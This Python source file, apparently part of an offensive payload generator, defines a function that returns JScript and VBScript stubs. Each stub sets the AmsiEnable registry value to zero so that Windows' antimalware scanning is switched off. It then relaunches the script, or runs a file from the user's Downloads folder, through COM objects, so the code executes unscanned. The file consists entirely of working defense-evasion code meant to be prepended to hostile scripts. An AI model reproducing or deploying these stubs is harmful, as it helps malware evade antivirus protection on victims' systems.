#!/usr/bin/python

def amsi_stub(file_type, technique, filename):

    # Slightly more elegant implementation of amsienable trick from @buffaloverflow
	## SYANiDE:  modified slightly to account for the one it replaces having incorporated a
	#, check whether it should Run The Jewels or not
	#, RElated: https://www.youtube.com/watch?v=vWaljXUiCaE  @1:20, @1:22
	#, RE: Lines: 31, 43, 45 equiv replicated by lines: 12, 18-20, 27
    js_bypass_new = """\nvar sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
var exit=1;

try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
		throw new Error(1, '');
	}else{
		exit=0
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
	WScript.Quit(1);
}\n\n
if(!exit){
"""

    js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
var exit=0;													//thanks
var WinNetwork = new ActiveXObject("WScript.Network");
var u = WinNetwork.UserName;
var oWSS = new ActiveXObject("WScript.Shell");
try{
var r = oWSS.RegRead(regpath);
}
catch(e){
oWSS.RegWrite(regpath, "0", "REG_DWORD");
var obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880");
var j = "c:\\\\users\\\\"+u+"\\\\downloads\\\\%s";
obj.Document.Application.ShellExecute(j,null,"C:\\Windows\\System32",null,0);
exit=1;														//thanks
}
if(!exit){													//thanks
\n\n""" % (filename)

    vbs_bypass_new = """\n
regpath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"
e = 0
Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")

On Error Resume Next
r = oWSS.RegRead(regpath)

If Err.Number <> 0 Then
    oWSS.RegWrite regpath, "0", "REG_DWORD"
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
	obj.Document.Application.ShellExecute WScript.ScriptFullName,Null,"C:\\Windows\\System32",Null,0
    e = 1
    Err.Clear
End If
If e <> 0 Then
WScript.Quit 1
End If
On Error Goto 0
\n\n"""

    vbs_bypass_1 = """\nregpath = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"
u = CreateObject("WScript.Network").UserName
e = 0
Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")

On Error Resume Next
r = oWSS.RegRead(regpath)

If Err.Number <> 0 Then
    oWSS.RegWrite regpath, "0", "REG_DWORD"
    j = "c:\\users\\"+u+"\\downloads\\%s"
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    obj.Document.Application.ShellExecute j,Null,"C:\\Windows\\System32",Null,0
    e = 1
    Err.Clear
End If
If e <> 0 Then
WScript.Quit 1
End If
On Error Goto 0
\n\n""" % (filename)

    if file_type in ["vba","vbs","hta"]:
        amsibypass = vbs_bypass_new
    else:
        amsibypass = js_bypass_new
    return amsibypass
